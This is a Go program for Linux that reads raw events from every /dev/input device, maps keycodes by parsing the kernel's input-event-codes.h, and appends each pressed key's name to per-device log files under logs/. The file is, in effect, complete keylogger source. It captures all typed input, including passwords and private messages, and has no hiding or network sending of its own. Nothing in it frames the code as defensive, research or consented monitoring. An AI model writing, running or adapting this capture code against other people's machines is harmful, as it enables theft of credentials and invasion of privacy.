package main

import (
	"bufio"
	"context"
	"encoding/binary"
	"errors"
	"fmt"
	"log"
	"os"
	"os/signal"
	"strings"
	"sync"
	"syscall"
	"time"
)

const EV_KEY = 0x01

type inputEvent struct {
	Time  syscall.Timeval
	Type  uint16
	Code  uint16
	Value int32
}

var (
	keyMap = make(map[uint16]string)
	logger = log.New(os.Stdout, "INFO: ", log.LstdFlags)
)

func loadKeyMap() error {
	file, err := os.Open("/usr/include/linux/input-event-codes.h")
	if err != nil {
		return fmt.Errorf("failed to open keycode file: %w", err)
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := scanner.Text()
		if !strings.HasPrefix(line, "#define KEY_") && !strings.HasPrefix(line, "#define BTN_") {
			continue
		}
		parts := strings.Fields(line)
		if len(parts) < 3 {
			continue
		}
		keyName := parts[1][4:] // Trim KEY_ and BTN_ prefix
		var code uint16
		if _, err := fmt.Sscanf(parts[2], "%d", &code); err != nil {
			logger.Printf("Failed to parse key code from line: %s", line)
			continue
		}
		keyMap[code] = keyName
	}

	if err := scanner.Err(); err != nil {
		return fmt.Errorf("error reading input-event-codes.h: %w", err)
	}

	return nil
}

func detectInputDevices() ([]string, error) {
	file, err := os.Open("/proc/bus/input/devices")
	if err != nil {
		return nil, err
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	var devicePaths []string

	for scanner.Scan() {
		line := scanner.Text()
		if strings.HasPrefix(line, "H: Handlers=") {
			parts := strings.Fields(line)
			for _, part := range parts {
				if strings.HasPrefix(part, "event") {
					devicePaths = append(devicePaths, "/dev/input/"+part)
				}
			}
		}
	}

	if err := scanner.Err(); err != nil {
		return nil, fmt.Errorf("error scanning input devices: %w", err)
	}

	if len(devicePaths) == 0 {
		return nil, errors.New("no suitable devices found")
	}

	return devicePaths, nil
}

func watchDevice(ctx context.Context, devicePath string, wg *sync.WaitGroup) {
	defer wg.Done()

	f, err := os.Open(devicePath)
	if err != nil {
		logger.Printf("Failed to open device %s: %v", devicePath, err)
		return
	}
	defer f.Close()

	dataChan := make(chan string, 100)
	doneChan := make(chan struct{})

	eventPath := strings.TrimPrefix(devicePath, "/dev/input/")
	go writeKeystrokeLog(dataChan, doneChan, eventPath)

	reader := bufio.NewReader(f)

	for {
		select {
		case <-ctx.Done():
			close(doneChan)
			return
		default:
			var event inputEvent
			err := binary.Read(reader, binary.LittleEndian, &event)
			if err != nil {
				logger.Printf("Error reading from device %s: %v", devicePath, err)
				close(doneChan)
				return
			}

			if event.Type == EV_KEY {
				keyName, exists := keyMap[event.Code]
				if !exists {
					keyName = fmt.Sprintf("Unknown(%d)", event.Code)
				}

				if event.Value == 1 {
					//logger.Printf("Key %s pressed", keyName)
					select {
					case dataChan <- keyName:
					case <-ctx.Done():
						return
					}
				} else if event.Value == 0 {
					//logger.Printf("Key %s released", keyName)
				}
			}
		}
	}
}

func writeKeystrokeLog(dataChan <-chan string, doneChan <-chan struct{}, eventPath string) {
	file, err := os.OpenFile("logs/"+eventPath+".log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		logger.Printf("Failed to open log file: %v", err)
		return
	}
	defer file.Close()

	writer := bufio.NewWriter(file)
	flushTimer := time.NewTimer(5 * time.Second)
	defer flushTimer.Stop()

	for {
		select {
		case <-doneChan:
			writer.Flush()
			return
		case data, ok := <-dataChan:
			if !ok {
				return
			}
			_, err := writer.WriteString(data)
			if err != nil {
				logger.Fatalf("Failed to write to log file: %v", err)
			}
			flushTimer.Reset(5 * time.Second)
		case <-flushTimer.C:
			writer.WriteString("\n")
			writer.Flush()
		}
	}
}

func main() {
	if err := loadKeyMap(); err != nil {
		logger.Fatalf("Failed to initialize key map: %v", err)
	}

	devicePaths, err := detectInputDevices()
	if err != nil {
		logger.Fatalf("Error detecting input devices: %v", err)
	}

	logger.Println("Monitoring device inputs. Press Ctrl+C to exit.")

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, os.Interrupt, syscall.SIGTERM)
	go func() {
		<-sigChan
		logger.Println("Shutting down...")
		cancel()
		os.Exit(0)
	}()

	var wg sync.WaitGroup
	for _, devicePath := range devicePaths {
		wg.Add(1)
		go watchDevice(ctx, devicePath, &wg)
	}

	wg.Wait()
	logger.Println("All devices stopped.")
}
